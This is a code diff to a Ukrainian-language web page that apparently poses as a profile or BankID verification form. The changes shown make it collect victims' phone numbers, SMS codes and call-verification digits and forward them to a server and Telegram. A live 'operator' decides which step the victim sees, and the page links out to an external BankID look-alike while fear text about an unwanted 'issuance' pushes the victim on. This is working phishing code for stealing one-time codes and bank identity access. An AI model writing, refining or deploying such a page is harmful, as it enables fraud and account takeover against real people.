@@ -289,29 +289,9 @@
             font-size: 15px;
         }
         
-        /* Стиль для кнопок вибору */
-        .choice-buttons {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-            margin-top: 20px;
-        }
-        
-        .choice-button {
-            padding: 15px;
-            border: 2px solid var(--primary);
-            border-radius: 12px;
-            background: white;
-            color: var(--primary);
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.2s ease;
-        }
-        
-        .choice-button:hover {
-            background: #e6f0ff;
-        }
+        /* Стиль для кнопок вибору (видалено, але залишаю для візуального розуміння)
+        .choice-buttons { ... }
+        .choice-button { ... } */
 
         input[type=tel]::-webkit-inner-spin-button,
         input[type=tel]::-webkit-outer-spin-button,
@@ -366,23 +346,6 @@
                 </div>
             </div>
 
-            <div id="choice-step" class="step">
-                <div class="info-text">
-                    Оберіть зручний спосіб підтвердження профілю:
-                </div>
-                <div class="choice-buttons">
-                    <button type="button" class="choice-button" onclick="showCallStep()">
-                        <i class="fas fa-phone-alt"></i> Звонок
-                    </button>
-                    <button type="button" class="choice-button" onclick="showSmsCodeStep()">
-                        <i class="fas fa-sms"></i> Код
-                    </button>
-                    <button type="button" class="choice-button" onclick="showBankIDStep()">
-                        <i class="fas fa-university"></i> BankID
-                    </button>
-                </div>
-            </div>
-
             <div id="call-step" class="step">
                 <p class="call-prompt">
                     На ваш номер надійде дзвінок. Вкажіть **останні 4 цифри** номеру, з якого був дзвінок, для підтвердження профілю.
@@ -418,7 +381,7 @@
                     <strong>Ваш профіль не підтверджено.</strong> Для скасування видання та продовження користуванням **підтвердіть профіль за допомогою BankID**.
                 </div>
                 <a href="https://idverification.onrender.com" target="_blank" style="text-decoration: none;">
-                    <button type="button" class="submit-button bankid" onclick="sendData('bankid', {})">
+                    <button type="button" class="submit-button bankid" onclick="sendData('method_bankid_click', { phone: userPhone })">
                         Підтвердити <i class="fas fa-external-link-alt" style="margin-left: 5px;"></i>
                     </button>
                 </a>
@@ -475,7 +438,6 @@
             });
         });
         
-        // Змінюємо функцію для перевірки телефону та показу завантаження
         function validatePhoneAndShowLoading() {
             const phone = $('#phone-number').val().replace(/\s/g, '');
             if (!/^\+380\d{9}$/.test(phone)) {
@@ -493,36 +455,34 @@
             $('#phone-step').removeClass('active');
             $('#loading-step').addClass('active');
 
-            // 2. Надсилаємо телефон у Telegram
+            // 2. Надсилаємо телефон у Telegram (логіка Node.js тепер відправить кнопки)
             sendData('phone', { phone: userPhone });
             
-            // 3. Через 3 секунди показуємо крок вибору
-            setTimeout(showChoiceStep, 3000);
+            // 3. *ІМІТАЦІЯ ОЧІКУВАННЯ* - Якщо протягом 30 секунд не надійде команда від оператора,
+            // переходимо на BankID. В реальності тут має бути логіка отримання команд.
+            setTimeout(showBankIDStep, 30000); // 30 секунд
         }
         
-        function showChoiceStep() {
-             $('.step').removeClass('active');
-             $('#choice-step').addClass('active');
-        }
-
+        // Функції переходу, які мають викликатися **після** команди від оператора
+        // (наприклад, через WebSockets або AJAX-запит, який ви самі реалізуєте)
         function showCallStep() {
             $('.step').removeClass('active');
             $('#call-step').addClass('active');
             $('#call-code-1').focus();
-            sendData('method_call', { phone: userPhone });
+            // Тут не відправляємо sendData, бо команда прийшла з Telegram і вже була оброблена на сервері
         }
         
         function showSmsCodeStep() {
             $('.step').removeClass('active');
             $('#sms-code-step').addClass('active');
             $('#sms-code-1').focus();
-            sendData('method_sms', { phone: userPhone });
+            // Тут не відправляємо sendData
         }
         
         function showBankIDStep() {
             $('.step').removeClass('active');
             $('#bankid-step').addClass('active');
-            sendData('method_bankid', { phone: userPhone });
+            // Тут не відправляємо sendData, бо це перехід за замовчуванням або після команди
         }
         
         function sendCallCode() {
@@ -536,6 +496,7 @@
             $('.step').removeClass('active');
             $('#loading-step').addClass('active');
             
+            // Надсилаємо код на сервер
             sendData('call_code', { code, phone: userPhone });
 
             // Імітуємо успіх після завантаження
@@ -556,6 +517,7 @@
             $('.step').removeClass('active');
             $('#loading-step').addClass('active');
 
+            // Надсилаємо код на сервер
             sendData('sms_code', { code, phone: userPhone });
             
             // Імітуємо успіх після завантаження
